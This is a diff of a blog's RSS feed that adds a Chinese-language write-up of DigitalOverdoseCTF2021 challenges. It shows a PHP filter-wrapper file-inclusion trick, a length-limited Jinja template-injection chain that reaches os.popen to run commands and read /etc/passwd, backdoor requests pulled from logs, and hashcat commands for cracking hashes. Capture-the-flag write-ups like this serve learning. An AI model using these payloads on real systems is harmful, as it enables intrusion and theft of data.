@@ -1,4 +1,237 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 04 Oct 2021 16:44:41 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>TSGCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</link><pubDate>Mon, 04 Oct 2021 16:44:41 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</guid><description>&lt;p>&lt;a href="https://score.ctf.tsg.ne.jp/challenges">https://score.ctf.tsg.ne.jp/challenges&lt;/a> | &lt;a href="https://ctftime.org/event/1431/tasks/">https://ctftime.org/event/1431/tasks/&lt;/a>&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 22 Oct 2021 11:54:15 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
+&lt;blockquote>
+&lt;p>Visit the website&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009120536593.png" alt="image-20211009120536593">&lt;/p>
+&lt;p>emmmm 联系这个题目 访问一下.git看看有没有备份文件泄露&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211019214445911.png" alt="image-20211019214445911">&lt;/p>
+&lt;p>用GitHacker下载泄露的git文件，有一个index.php&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
+/**
+* Simple sodium crypto class for PHP &amp;gt;= 7.2
+* @author MRK
+*/
+class crypto {
+/**
+*
+* @return type
+*/
+static public function create_encryption_key() {
+return base64_encode(sodium_crypto_secretbox_keygen());
+}
+/**
+* Encrypt a message
+*
+* @param string $message - message to encrypt
+* @param string $key - encryption key created using create_encryption_key()
+* @return string
+*/
+static function encrypt($message, $key) {
+$key_decoded = base64_decode($key);
+$nonce = random_bytes(
+SODIUM_CRYPTO_SECRETBOX_NONCEBYTES
+);
+$cipher = base64_encode(
+$nonce .
+sodium_crypto_secretbox(
+$message, $nonce, $key_decoded
+)
+);
+sodium_memzero($message);
+sodium_memzero($key_decoded);
+return $cipher;
+}
+/**
+* Decrypt a message
+* @param string $encrypted - message encrypted with safeEncrypt()
+* @param string $key - key used for encryption
+* @return string
+*/
+static function decrypt($encrypted, $key) {
+$decoded = base64_decode($encrypted);
+$key_decoded = base64_decode($key);
+if ($decoded === false) {
+throw new Exception('Decryption error : the encoding failed');
+}
+if (mb_strlen($decoded, '8bit') &amp;lt; (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) {
+throw new Exception('Decryption error : the message was truncated');
+}
+$nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, '8bit');
+$ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, '8bit');
+$plain = sodium_crypto_secretbox_open(
+$ciphertext, $nonce, $key_decoded
+);
+if ($plain === false) {
+throw new Exception('Decryption error : the message was tampered with in transit');
+}
+sodium_memzero($ciphertext);
+sodium_memzero($key_decoded);
+return $plain;
+}
+}
+$privatekey = &amp;quot;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=&amp;quot;;
+$flag = file_get_contents('../flag.txt');
+$enc = crypto::encrypt($flag, $privatekey);
+echo $enc;
+?&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;br&amp;gt;
+Only if you could see the source code.
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>包含了解密的模块，所以用它解密一下即可&lt;/p>
+&lt;p>————这里我的本地php一直出问题 版本7.3.4和7.4.21都报错&lt;/p>
+&lt;h2 id="webnotrequired">Web/notrequired&lt;/h2>
+&lt;blockquote>
+&lt;p>Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?&lt;/p>
+&lt;/blockquote>
+&lt;p>注意到链接是http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html&lt;/p>
+&lt;p>用伪协议看一下index.php的源码/index.php?file=php://filter/convert.base64-encode/resource=index.php&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009193402728.png" alt="image-20211009193402728">&lt;/p>
+&lt;p>访问/bin/secrets.txt，得到 QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==&lt;/p>
+&lt;p>&lt;code>BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}&lt;/code>&lt;/p>
+&lt;h2 id="webmadlib">Web/madlib&lt;/h2>
+&lt;blockquote>
+&lt;p>I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!&lt;/p>
+&lt;p>Try it out and let me know what you think! The character length limit should make this app pretty secure.&lt;/p>
+&lt;/blockquote>
+&lt;p>一个flask的webapp&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211020005245072.png" alt="image-20211020005245072">&lt;/p>
+&lt;p>先看下源码&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>
+&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/madlib&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">madlib&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">verb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;verb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">noun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;noun&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">adjective&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;adjective&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">person&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;person&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">place&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;place&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">place&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;your words must not be longer than 21 characters!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
+&lt;span style="color:#111">madlib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;To find out what this is you must &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> the internet then get to the &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> system through the visual MAC hard drive and program the open-source but overriding the bus won&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> taught me this trick when we met in &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">place&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> allowing you to download the knowledge of what this is directly to your brain.&amp;#39;&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">madlib&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;This madlib only takes five words&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
+&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/app/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>看到了熟悉的模板渲染（语段来自于&lt;a href="https://www.reddit.com/user/masterhacker_bot/">u/masterhacker_bot&lt;/a>），只会渲染特定的位置，而且有个特殊的&lt;code>{adjective}.{person}&lt;/code>&lt;/p>
+&lt;p>存在5个可以ssti的地方，但是限制每一个框字符数必须在21个之内；其中还有两个非常特殊的&lt;code>{adjective}.{person}&lt;/code>连了起来，我们可以用这个&lt;code>.&lt;/code>点号连接我们payload的长度&lt;/p>
+&lt;p>这样相当于有4个可以构造的地方，前两个用来将长长的payload用短的变量及逆行替换，第三个是payload本体，第三和第四个位置均是回显位；首先通过&lt;code>config.update&lt;/code>方法不断地向后取值来拿到可以用的函数并将其存储在&lt;code>config.a&lt;/code>中，之后调用它来rce&lt;/p>
+&lt;pre tabindex="0">&lt;code>{%set x=config%}
+{%set y=x.update%}
+{{y(a=x
+__class__.__init__)}}
+{{config.a}}
+&lt;/code>&lt;/pre>&lt;p>回显&lt;code>&amp;lt;function Config.__init__ at 0x7fd75dae31e0&amp;gt;&lt;/code>，现在我们设法调用函数来执行命令&lt;/p>
+&lt;pre tabindex="0">&lt;code>{{y(a=x.a
+__globals__['os'])}}
+&lt;/code>&lt;/pre>&lt;p>回显&lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.6/os.py'&amp;gt;&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>{{y(a=x.a
+popen)}}
+&lt;/code>&lt;/pre>&lt;p>回显&lt;code>&amp;lt;function popen at 0x7fd75ed5a730&amp;gt;&lt;/code>，此时我们的&lt;code>config.a&lt;/code>就是&lt;code>os.popen()&lt;/code>，现在来调用它来执行命令&lt;/p>
+&lt;pre tabindex="0">&lt;code>{%set x=config%}
+{%set y=x.a%}
+{{y('uname -a')
+read()}}
+{{config.a}}
+&lt;/code>&lt;/pre>&lt;p>回显&lt;code>Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux&lt;/code>，成功执行了命令，接下来就很简单了，读一波flag&lt;/p>
+&lt;pre tabindex="0">&lt;code>{{y('cat flag.txt')
+read()}}
+&lt;/code>&lt;/pre>&lt;p>&lt;code>DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}&lt;/code>&lt;/p>
+&lt;p>————很幸运的是最后我们的payload正好小于21个字符，显然我们被长度限制了发挥，但是这里还有别的trick&lt;/p>
+&lt;p>Jinja不仅支持模板内部的变量赋值还支持&lt;code>~&lt;/code>进行字符串的连接，再利用上&lt;code>config.command&lt;/code>甚至能读出/etc/passwd&lt;/p>
+&lt;pre tabindex="0">&lt;code>{%set x=config%}
+{%set y=x.update%}
+{%set p='cat /etc'%}
+{%set q=p~'/passw'%}
+{{y(b=q~'d')}}
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{%set x=config%}
+{%set y=x.a%}
+{%set z=config.b%}
+{{z}}
+{{y(z).read()}}
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211021172308541.png" alt="image-20211021172308541">&lt;/p>
+&lt;p>参考：&lt;a href="https://anakint.medium.com/digital-overdose-2021-autumn-ctf-writeup-madlib-web-c51c5ded5260">Digital Overdose 2021 Autumn CTF Writeup — madlib (web)&lt;/a>&lt;/p>
+&lt;h2 id="log-analysispart1---ingress">Log Analysis/Part1 - Ingress&lt;/h2>
+&lt;blockquote>
+&lt;p>Our website was hacked recently and the attackers completely ransomwared our server!&lt;/p>
+&lt;p>We&amp;rsquo;ve recovered it now, but we don&amp;rsquo;t want it to happen again.&lt;/p>
+&lt;p>Here are the logs from before the attack, can you find out what happened?&lt;/p>
+&lt;/blockquote>
+&lt;p>给出了访问日志，有庞大的数据，n行~~，但是不太会看~~&lt;/p>
+&lt;p>在37557行出现了访问&lt;code>/ywesusnz cmd%3Dcd+..&lt;/code>，往后还有一些ywesusnz开头的，37629行出现了&lt;code>/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==&lt;/code>，b64解密&lt;/p>
+&lt;p>&lt;code>DO{better_remove_that_backdoor}&lt;/code>&lt;/p>
+&lt;h2 id="log-analysispart-2---investigation">Log Analysis/Part 2 - Investigation&lt;/h2>
+&lt;blockquote>
+&lt;p>Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don&amp;rsquo;t understand how the attacker found it so quickly.&lt;/p>
+&lt;p>We suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?&lt;/p>
+&lt;p>Please submit the attackers IP as the flag as follow, DO{x.x.x.x}&lt;/p>
+&lt;/blockquote>
+&lt;p>仍然是给出了很多行的日志&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022081303705.png" alt="image-20211022081303705">&lt;/p>
+&lt;p>发现了可疑的内容&lt;code>DO{45.85.1.176}&lt;/code> 但是提交flag错误&lt;/p>
+&lt;p>（然后发现是很傻逼的把200.13.84.124当作flag交了……&lt;/p>
+&lt;h2 id="log-analysispart-3---backup-policy">Log Analysis/Part 3 - Backup Policy&lt;/h2>
+&lt;blockquote>
+&lt;p>So it looks like the attacker scanned our site for old backups right? Did he get one?&lt;/p>
+&lt;/blockquote>
+&lt;p>接着找，发现了/backup.zip的请求是200ok&lt;/p>
+&lt;p>但是交flag的时候不知道交啥，看了wp才发现藏在了UA头里&lt;/p>
+&lt;pre tabindex="0">&lt;code>Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36
+&lt;/code>&lt;/pre>&lt;p>将中间那一串b64解密后得到&lt;/p>
+&lt;p>&lt;code>DO{s3cr3t___agent}&lt;/code>&lt;/p>
+&lt;h2 id="source-analysisa1---c-nanigans">Source Analysis/A1 - C-nanigans&lt;/h2>
+&lt;blockquote>
+&lt;p>Find the flag parts in the source code, assemble the flag, submit the flag.&lt;/p>
+&lt;p>(This code may not compile, and it is useless to attempt to do so)&lt;/p>
+&lt;/blockquote>
+&lt;p>提示我们关注源码而不是编译&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084007781.png" alt="image-20211022084007781">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022083958098.png" alt="image-20211022083958098">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084018091.png" alt="image-20211022084018091">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084123654.png" alt="image-20211022084123654">&lt;/p>
+&lt;pre tabindex="0">&lt;code>444f7b
+733075526333
+5f406e616c79333173
+7d
+&lt;/code>&lt;/pre>&lt;p>hex解密后得到&lt;code>DO{s0uRc3_@naly31s}&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-1">Hash Cracking/Hash 1&lt;/h2>
+&lt;pre tabindex="0">&lt;code>54a09c22fc0d1af44865e411ff6e8d50
+&lt;/code>&lt;/pre>&lt;p>&lt;code>phantomlover&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-2">Hash Cracking/Hash 2&lt;/h2>
+&lt;pre tabindex="0">&lt;code>52ed4b109a2662fdf15edfd95632667869fc5802
+&lt;/code>&lt;/pre>&lt;p>&lt;code>fishchips&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-3">Hash Cracking/Hash 3&lt;/h2>
+&lt;pre tabindex="0">&lt;code>550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81
+&lt;/code>&lt;/pre>&lt;p>&lt;code>mommadobbins&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-4">Hash Cracking/Hash 4&lt;/h2>
+&lt;pre tabindex="0">&lt;code>451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723
+&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://md5hashing.net/hash_type_checker">Hash Identifier&lt;/a>&lt;/p>
+&lt;p>hashcat -m 6900 ghost&lt;/p>
+&lt;p>&lt;code>happyfamily&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-5">Hash Cracking/Hash 5&lt;/h2>
+&lt;pre tabindex="0">&lt;code>$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6
+&lt;/code>&lt;/pre>&lt;p>hashcat -m 3200 bcrypt&lt;/p>
+&lt;p>&lt;code>cowabunga&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-6">Hash Cracking/Hash 6&lt;/h2>
+&lt;pre tabindex="0">&lt;code>$1$veryrand$QetWu27IoJ2FFSG30xKAQ.
+&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer&lt;/a>&lt;/p>
+&lt;p>hashcat -m 500 MD5-Crypt&lt;/p>
+&lt;p>&lt;code>scottiebanks&lt;/code>&lt;/p>
+&lt;h2 id="hash-crackinghash-7">Hash Cracking/Hash 7&lt;/h2>
+&lt;pre tabindex="0">&lt;code>$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1
+&lt;/code>&lt;/pre>&lt;p>hashcat -m 1800 sha512crypt $6$&lt;/p>
+&lt;p>&lt;code>igetmoney&lt;/code>&lt;/p>
+&lt;hr>
+&lt;p>很水的wp，或者说是复现，没有什么参考价值；挺有意思的题，学到了ssti的新trick；Source Analysis的剩下两个题全是web+reverse/crypto/pwn（指路wp: &lt;a href="https://lo0l.com/2021/10/11/digitaloverdose.html#source-analysis---boris">Boris&lt;/a> | &lt;a href="https://github.com/maulvialf/CTF-Writeups/tree/main/2021/004-digitaloverdose/source-analysis/c1-i_think_this_should_be_c4">I think this could be C4&lt;/a>），谢谢，完全看不懂，已经跪了&lt;/p>
+&lt;p>web狗死路一条死路一条死路一条死路一条死路一条&lt;/p>
+&lt;p>😅&lt;/p></description></item><item><title>TSGCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</link><pubDate>Mon, 04 Oct 2021 16:44:41 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</guid><description>&lt;p>&lt;a href="https://score.ctf.tsg.ne.jp/challenges">https://score.ctf.tsg.ne.jp/challenges&lt;/a> | &lt;a href="https://ctftime.org/event/1431/tasks/">https://ctftime.org/event/1431/tasks/&lt;/a>&lt;/p>
 &lt;h2 id="webwelcome-to-tsg-ctf">Web/Welcome to TSG CTF!&lt;/h2>
 &lt;blockquote>
 &lt;p>&lt;strong>We want to welcome you,&lt;/strong> &lt;em>seriously.&lt;/em>&lt;/p>
